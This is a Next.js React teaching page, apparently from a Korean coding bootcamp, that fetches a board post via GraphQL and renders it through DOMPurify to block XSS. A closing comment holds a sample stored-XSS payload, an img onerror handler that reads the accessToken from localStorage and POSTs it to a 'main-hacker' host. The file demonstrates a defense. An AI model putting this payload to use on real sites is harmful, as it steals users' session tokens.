"use client";

import { gql, useQuery } from "@apollo/client";
import { useParams } from "next/navigation";
import { useRouter } from "next/router";
import Dompurify from "dompurify";

const FETCH_BOARD = gql`
  query fetchBoard($boardId: ID!) {
    fetchBoard(boardId: $boardId) {
      _id
      writer
      title
      contents
    }
  }
`;

export default function StaticRoutingMovedPage() {
  const params = useParams();

  const { data } = useQuery(FETCH_BOARD, {
    variables: { boardId: params.boardId },
  });

  console.log(data);

  return (
    <div>
      {/* <div>1번 게시글 상세페이지 이동이 완료되었습니다.</div> */}
      <div>작성자: {data && data.fetchBoard.writer}</div>
      <div>제목: {data?.fetchBoard.title}</div>
      {/* <div>내용: {data ? data.fetchBoard.contents : ""}</div> */}

      {/* 내용에 들어있는 태그를 문자열이 아닌 진짜 태그로 인식하기 */}
      {/* <div
        dangerouslySetInnerHTML={{
          __html: data?.fetchBoard.contents,
        }}
      /> */}

      {/* 내용에 들어있는 태그가 <script />태그처럼 공격 태그가 있을 수 있으니 막아줘! */}
      <div
        dangerouslySetInnerHTML={{
          __html: Dompurify.sanitize(data?.fetchBoard.contents),
        }}
      />
    </div>
  );
}

/* playground XSS 공격
======================================================
contents: """
          <img src='#' onerror='
            const 훔친토큰 = localStorage.getItem("accessToken");
            fetch("http://main-hacker.codebootcamp.co.kr/token", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ token: 훔친토큰 })
            })' 
          />
"""
======================================================
*/
